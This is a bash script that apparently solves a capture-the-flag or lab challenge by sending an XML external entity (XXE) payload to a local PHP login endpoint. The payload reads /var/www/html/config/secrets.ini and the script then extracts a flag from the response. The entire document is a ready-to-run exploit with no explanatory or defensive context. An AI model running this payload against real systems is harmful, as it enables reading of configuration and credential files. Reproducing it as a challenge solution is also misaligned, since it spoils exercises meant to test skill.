#!/usr/bin/env bash
set -euo pipefail

HOST="http://localhost:8082"

XML='<?xml version="1.0"?>
<!DOCTYPE login [<!ENTITY xxe SYSTEM "file:///var/www/html/config/secrets.ini">]>
<login><username>&xxe;</username><password>x</password></login>'

RESPONSE=$(curl -sf -X POST "$HOST/index.php" -H "Content-Type: application/xml" --data "$XML" || true)
echo "$RESPONSE"

FLAG=$(echo "$RESPONSE" | grep -oE 'flag\{[^}]*\}' | head -n1)
echo "$FLAG"
